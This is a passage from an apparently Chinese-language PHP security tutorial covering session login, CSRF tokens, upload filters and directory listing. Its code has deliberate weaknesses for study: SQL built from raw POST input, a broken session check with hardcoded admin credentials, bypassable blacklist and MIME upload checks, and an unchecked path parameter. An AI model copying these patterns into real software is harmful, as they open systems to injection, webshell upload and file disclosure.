class="line"><span class="comment">//1.接收输入账号密码</span></span><br><span class="line"><span class="variable">$user</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$pass</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="comment">//2.进行判断账号密码是否正确</span></span><br><span class="line"><span class="comment">// 构建 SQL 查询语句，用于判断账号密码是否正确</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM admin WHERE username=&#x27;<span class="subst">$user</span>&#x27; AND password=&#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line"><span class="comment">//echo $sql;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行 SQL 查询</span></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>, <span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断请求是否为 POST</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">    <span class="comment">// 检查查询结果行数是否大于 0</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$data</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]=<span class="variable">$user</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;password&#x27;</span>]=<span class="variable">$pass</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 重定向到 index-c.php 页面</span></span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: index-s.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();  <span class="comment">// 终止脚本执行</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;登录失败！&#x27;)&lt;/script&gt;&quot;</span>; <span class="comment">// 输出登录失败的提示</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//登入界面文件,使用session验证</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//登录成功首页文件-采用session验证</span></span><br><span class="line"><span class="comment">//判断省去了数据库查询获取帐号密码的操作 直接赋值</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]!=<span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="variable">$_SESSION</span>[<span class="string">&#x27;password&#x27;</span>]!=<span class="string">&#x27;123456&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: admin-s.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;后台首页&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;后台首页&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;欢迎您，<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]; <span class="meta">?&gt;</span>！&lt;/p&gt;</span><br><span class="line">&lt;p&gt;&lt;a href=<span class="string">&quot;logout-s.php&quot;</span>&gt;退出登录&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//登出文件,使用session验证</span></span><br><span class="line"><span class="comment">// 开始会话</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 清除 SESSION 变量，并销毁会话</span></span><br><span class="line"><span class="title function_ invoke__">session_unset</span>();</span><br><span class="line"><span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 重定向到登录页面</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: admin-s.php&#x27;</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="token"><a href="#token" class="headerlink" title="token"></a>token</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 生成Token并将其存储在Session中</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="comment">//1.因为是用的session维持会话，token已经绑定到下面的表单了</span></span><br><span class="line"><span class="comment">//2.token，生成之后直接存到session里，主要是方便重置token,</span></span><br><span class="line"><span class="comment">//每次token随表单提交后都需要重置以保持token的唯一性。</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>] = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;后台登录&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        body &#123;</span><br><span class="line">            background-color: <span class="comment">#f1f1f1;</span></span><br><span class="line">        &#125;</span><br><span class="line">        .login &#123;</span><br><span class="line">            width: <span class="number">400</span>px;</span><br><span class="line">            margin: <span class="number">100</span>px auto;</span><br><span class="line">            background-color: <span class="comment">#fff;</span></span><br><span class="line">            border-radius: <span class="number">5</span>px;</span><br><span class="line">            box-shadow: <span class="number">0</span> <span class="number">0</span> <span class="number">10</span>px <span class="title function_ invoke__">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0.3</span>);</span><br><span class="line">            padding: <span class="number">30</span>px;</span><br><span class="line">        &#125;</span><br><span class="line">        .login h2 &#123;</span><br><span class="line">            text-align: center;</span><br><span class="line">            font-size: <span class="number">2</span>em;</span><br><span class="line">            margin-bottom: <span class="number">30</span>px;</span><br><span class="line">        &#125;</span><br><span class="line">        .login label &#123;</span><br><span class="line">            display: block;</span><br><span class="line">            margin-bottom: <span class="number">20</span>px;</span><br><span class="line">            font-size: <span class="number">1.2</span>em;</span><br><span class="line">        &#125;</span><br><span class="line">        .login input[type=<span class="string">&quot;text&quot;</span>], .login input[type=<span class="string">&quot;password&quot;</span>] &#123;</span><br><span class="line">            width: <span class="number">100</span>%;</span><br><span class="line">            padding: <span class="number">10</span>px;</span><br><span class="line">            border: <span class="number">1</span>px solid <span class="comment">#ccc;</span></span><br><span class="line">            border-radius: <span class="number">5</span>px;</span><br><span class="line">            font-size: <span class="number">1.2</span>em;</span><br><span class="line">            margin-bottom: <span class="number">20</span>px;</span><br><span class="line">        &#125;</span><br><span class="line">        .login input[type=<span class="string">&quot;submit&quot;</span>] &#123;</span><br><span class="line">            background-color: <span class="comment">#2ecc71;</span></span><br><span class="line">            color: <span class="comment">#fff;</span></span><br><span class="line">            border: none;</span><br><span class="line">            padding: <span class="number">10</span>px <span class="number">20</span>px;</span><br><span class="line">            border-radius: <span class="number">5</span>px;</span><br><span class="line">            font-size: <span class="number">1.2</span>em;</span><br><span class="line">            cursor: pointer;</span><br><span class="line">        &#125;</span><br><span class="line">        .login input[type=<span class="string">&quot;submit&quot;</span>]:hover &#123;</span><br><span class="line">            background-color: <span class="comment">#27ae60;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">login</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">h2</span>&gt;后台登录&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;!-- 提交表单到 &quot;<span class="title">token_check</span>.<span class="title">php</span>&quot;，使用 <span class="title">POST</span> 方法 --&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">form</span> <span class="title">action</span>=&quot;<span class="title">token_check</span>.<span class="title">php</span>&quot; <span class="title">method</span>=&quot;<span class="title">post</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;!-- 隐藏域用于存储 <span class="title">CSRF</span> <span class="title">token</span> --&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">hidden</span>&quot; <span class="title">name</span>=&quot;<span class="title">token</span>&quot; <span class="title">value</span>=&quot;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">_SESSION</span>[&#x27;<span class="title">token</span>&#x27;] ; ?&gt;&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">username</span>&quot;&gt;用户名:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">username</span>&quot; <span class="title">id</span>=&quot;<span class="title">username</span>&quot; <span class="title">required</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">password</span>&quot;&gt;密码:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">password</span>&quot; <span class="title">name</span>=&quot;<span class="title">password</span>&quot; <span class="title">id</span>=&quot;<span class="title">password</span>&quot; <span class="title">required</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">value</span>=&quot;登录&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="comment">// 从 POST 请求中获取 token，如果不存在则设为空字符串</span></span><br><span class="line"><span class="variable">$token</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;token&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$token</span> !== <span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>]) &#123;</span><br><span class="line">    <span class="comment">// token不匹配，禁止访问</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;HTTP/1.1 403 Forbidden&#x27;</span>);</span><br><span class="line">    <span class="comment">// 生成新的 token</span></span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>] = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>));</span><br><span class="line">    <span class="comment">// 输出访问被拒绝的信息</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Access denied&#x27;</span>;</span><br><span class="line">    <span class="comment">// 终止脚本执行</span></span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">// 生成新的 token</span></span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>] = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>));</span><br><span class="line">    <span class="comment">// 检查用户名和密码是否匹配</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]==<span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]==<span class="string">&#x27;123456&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;登录成功!&#x27;</span>;</span><br><span class="line">        <span class="comment">// 输出管理员访问信息</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;你是管理员可以访问文件管理页面！&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;登录失败！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h1><h2 id="上传"><a href="#上传" class="headerlink" title="上传"></a>上传</h2><p>$_FILES：PHP中一个预定义的超全局变量，用于在上传文件时从客户端接收文件，并将其保存到服务器上。它是一个包含上传文件信息的数组，包括文件名、类型、大小、临时文件名等信息。</p><p>$_FILES[“表单值”][“name”] 获取上传文件原始名称</p><p>$_FILES[“表单值”][“type”] 获取上传文件MIME类型</p><p>$_FILES[“表单值”][“size”] 获取上传文件字节单位大小</p><p>$_FILES[“表单值”][“tmp_name”] 获取上传的临时副本文件名</p><p>$_FILES[“表单值”][“error”] 获取上传时发生的错误代码</p><p>move_uploaded_file() 将上传的文件移动到指定位置的函数</p><p>上传的两种架构：</p><p>1.上传到服务器本身存储磁盘</p><p>2.上传到云存储OSS（OSS中的文件无法被解析）</p><h3 id="文件后缀无过滤"><a href="#文件后缀无过滤" class="headerlink" title="文件后缀无过滤"></a>文件后缀无过滤</h3><p>创建upload.php和upload.html（upload.html用chatgpt实现实现）</p><p>enctype&#x3D;”multipart&#x2F;form-data” 告诉服务器，表单中包含了文件上传的数据，并且服务器需要以二进制格式解析这些数据。这样可以确保文件等二进制数据能够正确地传输到服务器。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!-- 提交表单到 <span class="string">&quot;upload.php&quot;</span>，使用 POST 方法，并启用文件上传功能 --&gt;</span><br><span class="line">&lt;form **action=<span class="string">&quot;upload.php&quot;</span>** method=<span class="string">&quot;POST&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    **&lt;!-- 用于标识上传文件的标签 --&gt;</span><br><span class="line">    &lt;label <span class="keyword">for</span>=<span class="string">&quot;file&quot;</span>&gt;选择文件:&lt;/label&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;!-- 文件输入框，允许用户选择要上传的文件 --&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> id=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;f&quot;</span>&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;!-- 提交按钮，触发文件上传操作 --&gt;</span><br><span class="line">    &lt;button type=<span class="string">&quot;submit&quot;</span>&gt;上传文件&lt;/button&gt;**</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>upload.php的实现并在项目创建新的目录，upload目录来存放上传的内容</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 从上传文件数组中获取文件名</span></span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;f&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="comment">// 从上传文件数组中获取文件类型</span></span><br><span class="line"><span class="variable">$type</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;f&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line"><span class="comment">// 从上传文件数组中获取文件大小</span></span><br><span class="line"><span class="variable">$size</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;f&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line"><span class="comment">// 从上传文件数组中获取临时文件名</span></span><br><span class="line"><span class="variable">$tmp_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;f&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="comment">// 从上传文件数组中获取错误码</span></span><br><span class="line"><span class="variable">$error</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;f&#x27;</span>][<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出文件名</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$name</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// 输出文件类型</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$type</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// 输出文件大小</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$size</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// 输出临时文件名</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$tmp_name</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// 输出错误码</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$error</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">**<span class="comment">// 如果成功将临时文件移动到指定目录，则输出文件上传成功</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmp_name</span>, <span class="string">&#x27;upload/&#x27;</span> . <span class="variable">$name</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;文件上传成功!&quot;</span>;</span><br><span class="line">&#125;**</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731669033546-724260f7-3e9d-4d41-92f6-e8aaf365c4b8.png"></p><h3 id="文件后缀黑名单过滤"><a href="#文件后缀黑名单过滤" class="headerlink" title="文件后缀黑名单过滤"></a>文件后缀黑名单过滤</h3><p>使用 explode 函数通过点号分割文件名，获取文件后缀</p><p>使用 end 函数获取数组中的最后一个元素，即文件后缀</p><p>检查文件后缀是否在黑名单中</p><p>如果文件后缀在黑名单中，输出非法后缀文件信息</p><p>如果文件后缀不在黑名单中，移动上传的文件到指定目录</p><p>输出上传成功的提示信息</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 上传文件后缀过滤，使用黑名单机制</span></span><br><span class="line"><span class="variable">$black_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;asp&#x27;</span>, <span class="string">&#x27;jsp&#x27;</span>, <span class="string">&#x27;aspx&#x27;</span>);</span><br><span class="line"><span class="comment">// 使用 explode 函数通过点号分割文件名，获取文件后缀</span></span><br><span class="line"><span class="variable">$fenge</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line"><span class="comment">// 使用 end 函数获取数组中的最后一个元素，即文件后缀</span></span><br><span class="line"><span class="variable">$exts</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$fenge</span>);</span><br><span class="line"><span class="comment">// 检查文件后缀是否在黑名单中</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$exts</span>, <span class="variable">$black_ext</span>)) &#123;</span><br><span class="line">    <span class="comment">// 如果文件后缀在黑名单中，输出非法后缀文件信息</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;非法后缀文件&#x27;</span> . <span class="variable">$exts</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 如果文件后缀不在黑名单中，移动上传的文件到指定目录</span></span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmp_name</span>, <span class="string">&#x27;upload/&#x27;</span> . <span class="variable">$name</span>);</span><br><span class="line">    <span class="comment">// 输出上传成功的提示信息</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;上传成功！&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1731669100055-e3fc7cf9-6f1f-44ff-b19e-a5a784e37bb3.png"></p><h3 id="文件后缀白名单过滤"><a href="#文件后缀白名单过滤" class="headerlink" title="文件后缀白名单过滤"></a>文件后缀白名单过滤</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//白名单过滤机制</span></span><br><span class="line">**<span class="comment">// 允许上传的文件后缀白名单</span></span><br><span class="line"><span class="variable">$allow_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>);**</span><br><span class="line"><span class="comment">// 使用 explode 函数通过点号分割文件名，获取文件后缀</span></span><br><span class="line"><span class="variable">$fenge</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line"><span class="comment">// 使用 end 函数获取数组中的最后一个元素，即文件后缀</span></span><br><span class="line"><span class="variable">$exts</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$fenge</span>);</span><br><span class="line"><span class="comment">// 检查文件后缀是否在允许的白名单中</span></span><br><span class="line">**<span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$exts</span>, <span class="variable">$allow_ext</span>)) &#123;</span><br><span class="line">    <span class="comment">// 如果文件后缀不在白名单中，输出非法后缀文件信息</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;非法后缀文件&#x27;</span> . <span class="variable">$exts</span>;**</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 如果文件后缀在白名单中，移动上传的文件到指定目录</span></span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmp_name</span>, <span class="string">&#x27;upload/&#x27;</span> . <span class="variable">$name</span>);</span><br><span class="line">    <span class="comment">// 输出上传成功的提示信息</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;上传成功！&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="文件MIME类型过滤"><a href="#文件MIME类型过滤" class="headerlink" title="文件MIME类型过滤"></a>文件MIME类型过滤</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//MIME文件类型过滤</span></span><br><span class="line">**<span class="comment">// 允许上传的文件 MIME 类型白名单</span></span><br><span class="line"><span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/png&#x27;</span>, <span class="string">&#x27;image/jpg&#x27;</span>, <span class="string">&#x27;image/jpeg&#x27;</span>, <span class="string">&#x27;image/gif&#x27;</span>);**</span><br><span class="line"><span class="comment">// 检查文件 MIME 类型是否在允许的白名单中</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$type</span>, <span class="variable">$allow_type</span>)) &#123;</span><br><span class="line">    <span class="comment">// 如果文件 MIME 类型不在白名单中，输出非法文件类型信息</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;非法文件类型&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 如果文件 MIME 类型在白名单中，移动上传的文件到指定目录</span></span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmp_name</span>, <span class="string">&#x27;upload/&#x27;</span> . <span class="variable">$name</span>);</span><br><span class="line">    <span class="comment">// 输出上传成功的提示信息</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;alert(&quot;上传成功&quot;)&lt;/script&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="显示"><a href="#显示" class="headerlink" title="显示"></a>显示</h2><p>1.打开目录读取文件列表</p><p>2.递归循环读取文件列表</p><p>3.判断是文件还是文件夹</p><p>4.PHP.INI目录访问控制</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">is_dir</span>() 函数用于检查指定的路径是否是一个目录（文件夹）</span><br><span class="line"><span class="title function_ invoke__">opendir</span>() 函数用于打开指定的目录，返回句柄，用来读取目录中的文件和子目录</span><br><span class="line"><span class="title function_ invoke__">readdir</span>() 函数用于从打开的目录句柄中读取目录中的文件和子目录</span><br><span class="line">open_basedir：PHP.INI中的设置用来控制脚本程序访问目录</span><br></pre></td></tr></table></figure><h3 id="opendir-readdir-区别"><a href="#opendir-readdir-区别" class="headerlink" title="opendir() readdir() 区别"></a>opendir() readdir() 区别</h3><blockquote><p>opendir() 函数：</p><p>opendir() 用于打开一个目录句柄（directory handle）。</p><p>接受一个参数，即要打开的目录的路径。</p><p>返回一个目录句柄，该句柄可以用于后续对目录的操作。</p><p>通常与 closedir() 配合使用，用于关闭目录句柄。</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">phpCopy code</span><br><span class="line"><span class="variable">$dir_handle</span> = <span class="title function_ invoke__">opendir</span>(<span class="string">&#x27;/path/to/directory&#x27;</span>);</span><br></pre></td></tr></table></figure><blockquote><p>readdir() 函数：</p><p>readdir() 用于读取目录句柄中的条目。</p><p>接受一个参数，即之前使用 opendir() 打开的目录句柄。</p><p>在每次调用时，返回目录中的下一个文件或目录的名称。</p><p>当没有更多的文件或目录时，返回 false。</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">phpCopy code</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">readdir</span>(<span class="variable">$dir_handle</span>);</span><br></pre></td></tr></table></figure><p>使用 opendir() 打开目录，然后使用 readdir() 循环读取目录中的文件和目录，最后使用 closedir() 关闭目录句柄。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">phpCopy code</span><br><span class="line"><span class="variable">$dir_handle</span> = <span class="title function_ invoke__">opendir</span>(<span class="string">&#x27;/path/to/directory&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ((<span class="variable">$file</span> = <span class="title function_ invoke__">readdir</span>(<span class="variable">$dir_handle</span>)) !== <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$file</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">closedir</span>(<span class="variable">$dir_handle</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="总体代码实现"><a href="#总体代码实现" class="headerlink" title="总体代码实现"></a>总体代码实现</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 获取要显示的目录，默认为当前目录</span></span><br><span class="line"><span class="variable">$dir</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>] ?? <span class="string">&#x27;./&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打开目录，读取文件列表 opendir</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filelist</span>(<span class="params"><span class="variable">$dir</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// 判断目录是否存在</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$dh</span> = <span class="title function_ invoke__">opendir</span>(<span class="variable">$dir</span>)) &#123;</span><br><span class="line">        <span class="comment">// 循环读取文件列表 while readdir</span></span><br><span class="line">        **<span class="keyword">while</span> ((<span class="variable">$file</span> = <span class="title function_ invoke__">readdir</span>(<span class="variable">$dh</span>)) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="comment">// 判断是文件还是文件夹 is_dir</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_dir</span>(<span class="variable">$dir</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file</span>)) &#123;</span><br><span class="line">                <span class="comment">// 如果是文件夹，显示文件夹图标和链接</span></span><br><span class="line">                <span class="keyword">echo</span> <span 